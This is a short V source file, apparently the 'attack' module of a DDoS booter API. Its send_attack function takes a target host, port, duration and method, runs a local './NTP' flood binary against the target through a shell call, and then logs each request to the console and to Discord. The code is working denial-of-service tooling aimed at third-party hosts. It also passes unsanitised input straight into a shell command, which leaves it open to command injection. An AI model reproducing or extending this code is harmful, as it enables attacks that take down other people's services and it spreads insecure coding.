module attack

import discord
import os

pub fn send_attack(username string, host string, port string, time string, method string) {
	if method == "NTP" {
		os.execute("./NTP $host $port $time")
	}
	println("[vAPI-Logs] Username: $username | host: $host | port: $port | time: $time | method: $method")
	discord.send_attack_logs(username, host, port, time, method)
}